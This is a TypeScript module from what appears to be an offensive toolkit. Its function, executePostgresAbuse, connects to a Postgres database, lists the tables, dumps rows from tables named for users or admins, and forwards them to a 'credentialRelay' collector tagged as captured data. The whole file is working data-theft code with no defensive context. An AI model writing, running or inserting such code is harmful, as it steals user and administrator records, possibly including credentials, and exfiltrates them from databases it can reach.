import { relayIngest } from "../credentialRelay";

export interface PostgresAbuseResult {
  tablesEnumerated: number;
  usersDumped: number;
  error?: string;
}

export async function executePostgresAbuse(connectionString: string): Promise<PostgresAbuseResult> {
  const result: PostgresAbuseResult = { tablesEnumerated: 0, usersDumped: 0 };
  try {
    const { Client } = await import("pg");
    const client = new Client({ connectionString, statement_timeout: 5000 });
    await client.connect();

    const tables = await client.query(
      "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 50"
    );
    result.tablesEnumerated = tables.rows.length;

    for (const t of tables.rows) {
      const name = t.table_name as string;
      if (!name) continue;
      if (name.toLowerCase().includes("user") || name.toLowerCase().includes("admin")) {
        try {
          const rows = await client.query(`SELECT * FROM ${name} LIMIT 100`);
          result.usersDumped += rows.rowCount || 0;
          relayIngest(
            rows.rows.map((r: any) => ({
              key: "DB_USER_ROW",
              value: JSON.stringify(r),
              type: "DB_ROW",
              source: "postgres_abuse",
              target: connectionString,
              capturedAt: new Date().toISOString(),
            }))
          );
        } catch {
          // ignore table-specific errors
        }
      }
    }

    await client.end();
  } catch (err: any) {
    result.error = err?.message || String(err);
  }
  return result;
}
